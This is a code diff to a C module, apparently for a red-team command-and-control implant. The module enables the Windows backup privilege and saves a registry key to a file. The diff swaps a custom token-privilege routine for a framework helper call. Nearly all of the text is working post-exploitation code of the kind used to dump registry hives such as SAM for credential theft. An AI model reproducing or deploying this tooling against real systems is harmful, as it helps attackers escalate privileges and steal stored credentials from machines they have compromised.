@@ -4,44 +4,9 @@
 DECLSPEC_IMPORT DWORD WINAPI Kernel32$GetLastError();
 DECLSPEC_IMPORT DWORD WINAPI Kernel32$CloseHandle(HANDLE hObjec);
 
-DECLSPEC_IMPORT BOOL WINAPI Advapi32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
-DECLSPEC_IMPORT BOOL WINAPI Advapi32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLui);
-DECLSPEC_IMPORT BOOL WINAPI Advapi32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLengt);
 DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
 DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegSaveKeyExA(HKEY hKey, LPCSTR lpFile, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD Flag);
 DECLSPEC_IMPORT LSTATUS WINAPI Advapi32$RegCloseKey(HKEY hKey);
-
-DWORD SetPrivilege(LPCSTR lpszPrivilege, BOOL bEnablePrivilege) {
-    HANDLE hToken = NULL;
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-	// Open a handle to the access token for the calling process. That is this running program
-	if (! Advapi32$OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-		BadgerDispatch(g_dispatch, "[-] Error OpenProcessToken: %lu\n", Kernel32$GetLastError()); 
-		goto SetPrivilege_end;
-	}
-    if (! Advapi32$LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) {
-        BadgerDispatch(g_dispatch, "[-] Error LookupPrivilegeValueA: %lu\n", Kernel32$GetLastError());
-        goto SetPrivilege_end; 
-    }
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    if (bEnablePrivilege) {
-        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    } else {
-        tp.Privileges[0].Attributes = 0;
-    }
-    if (! Advapi32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) {
-        BadgerDispatch(g_dispatch, "[-] Error AdjustTokenPrivileges: %lu\n", Kernel32$GetLastError());
-        goto SetPrivilege_end; 
-    } 
-
-SetPrivilege_end:
-	if (hToken) {
-		Kernel32$CloseHandle(hToken);
-	}
-    return Kernel32$GetLastError();
-}
 
 DWORD savereg(HKEY hive, const CHAR* regpath, const CHAR* outfile) {
 	DWORD dwresult = 0;
@@ -108,9 +73,8 @@ void coffee( char ** argv, int argc, WCHAR** dispatch) {
         lpszRegPathName = NULL;
     }
     BadgerDispatch(dispatch, "[*] Registry path: %s\n", lpszRegPathName);
-	dwErrorCode = SetPrivilege(SE_BACKUP_NAME, TRUE);
-	if (ERROR_SUCCESS != dwErrorCode) {
-		BadgerDispatch(dispatch, "[-] Error SetPrivilege: %lu\n", Kernel32$GetLastError());
+	if (! BadgerAddPrivilege(SE_BACKUP_NAME)) {
+		BadgerDispatch(dispatch, "[-] Error setting privilege\n");
 		goto main_end;
 	}
 	BadgerDispatch(dispatch, "[*] Saving registry key '%s\\%s' to file '%s'\n", hkey, lpszRegPathName, lpszOutputFilename);
